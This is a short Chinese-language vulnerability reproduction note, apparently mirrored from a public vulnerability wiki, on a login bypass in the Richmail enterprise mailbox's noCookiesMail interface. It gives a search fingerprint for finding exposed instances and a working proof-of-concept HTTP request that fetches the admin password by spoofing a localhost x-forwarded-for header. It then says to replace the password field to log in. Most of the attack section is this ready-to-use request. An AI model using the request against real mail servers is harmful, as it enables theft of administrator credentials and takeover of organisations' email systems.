---
title: "Richmail 企业邮箱 noCookiesMail 登陆绕过漏洞"
date: 2026-10-16 09:09:04
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "Richmail-企业邮箱"
tags:
  - "Richmail-企业邮箱"
  - "漏洞复现"
---
## 漏洞描述

Richmail 企业邮箱 noCookiesMail 接口存在登陆绕过漏洞，攻击者通过漏洞可以获取管理员账号密码登录后台

## 漏洞影响

Richmail 企业邮箱

## 网络测绘

```
"Richmail 企业邮箱"
```

## 漏洞复现

登陆页面

![image-20231115104548787](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115104548787.png)

poc

```
GET /RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin HTTP/1.1 
Host:
Cache-Control: max-age=0 
Content-Type: Application/X-www-Form
x-forwarded-for: 127.0.0.1
```

![image-20231115104603790](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115104603790.png)

替换请求中的password字段即可登陆。

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/Richmail-%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-noCookiesMail-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md)
